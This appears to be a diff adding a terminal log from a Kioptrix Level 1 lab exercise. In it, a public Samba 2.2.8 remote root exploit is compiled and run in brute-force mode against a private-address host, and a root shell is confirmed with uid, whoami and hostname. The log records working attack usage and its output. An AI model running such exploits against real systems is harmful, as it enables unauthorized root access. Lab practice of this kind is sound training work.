@@ -1,0 +1,14 @@
+➜  samba_2.2.1a_139 gcc -o e 10.c && ./e -b 0 192.168.122.238
+samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
+--------------------------------------------------------------
++ Bruteforce mode. (Linux)
++ Host is running samba.
++ Worked!
+--------------------------------------------------------------
+*** JE MOET JE MUIL HOUWE
+Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
+uid=0(root) gid=0(root) groups=99(nobody)
+whoami
+root
+hostname
+kioptrix.level1
